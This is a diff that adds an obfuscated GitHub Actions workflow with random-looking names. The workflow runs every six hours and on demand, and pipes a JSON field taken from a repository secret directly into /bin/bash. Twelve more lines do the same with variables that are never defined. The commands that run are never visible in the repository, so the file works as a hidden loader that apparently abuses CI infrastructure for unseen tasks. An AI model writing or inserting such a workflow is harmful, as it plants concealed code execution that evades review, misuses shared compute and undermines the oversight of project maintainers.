@@ -1,0 +1,28 @@
+name: hejulifan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: hejulifan
+        env:
+          ne096: ${{ secrets.ne096 }}
+        run: |
+          echo $ne096 | jq -r .q0867 | /bin/bash
+          echo $yu23908 | jq -r .nyjc6192 | /bin/bash
+          echo $brv275 | jq -r .suqxq83401 | /bin/bash
+          echo $tvkj24 | jq -r .rofa6822 | /bin/bash
+          echo $yqk322 | jq -r .kepb5 | /bin/bash
+          echo $o79 | jq -r .gi22398 | /bin/bash
+          echo $rilq91 | jq -r .tasqj4195 | /bin/bash
+          echo $rji38 | jq -r .v41388 | /bin/bash
+          echo $wwh200 | jq -r .o14 | /bin/bash
+          echo $x4 | jq -r .hs44 | /bin/bash
+          echo $fynwn1443 | jq -r .f4 | /bin/bash
+          echo $ckbuk116 | jq -r .ucem24572 | /bin/bash
+          echo $klihj10 | jq -r .zceov7 | /bin/bash
+
